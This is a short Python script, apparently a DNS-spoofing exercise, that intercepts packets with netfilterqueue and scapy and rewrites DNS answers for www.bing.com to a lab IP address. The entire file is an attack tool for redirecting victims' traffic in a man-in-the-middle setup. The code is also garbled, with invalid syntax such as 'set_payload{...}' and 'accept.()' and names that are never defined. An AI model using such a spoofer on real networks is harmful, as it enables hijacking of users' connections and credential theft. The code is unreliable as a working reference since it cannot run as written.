#!/usr/bin/env python
import netfilterqueue
import scapy

def p_packet(packet):
    scapy_pack = scapy.IP(packet.get_payload())
    if scapy_pack.haslayer(scapy.DNSRR):
        qname = scapy_pack[scapy.DNSRR].qname
        if 'www.bing.com' in qname:
            print('[+] spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.16')
            scapy_pack[scapy.DNS].an = answer
            scapy_pack[scapy.DNS].ancount = 1

            del scapy_pack[IP].len
            del scapy_pack[scapy.IP].chksum
            del scapy_pack[scapy.UDP].chksum
            del scapy_pack[scapy.UDP].len

            packet.set_payload{str(scapy_pack)}

    packet.accept.()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, p_packet)
queue.run()


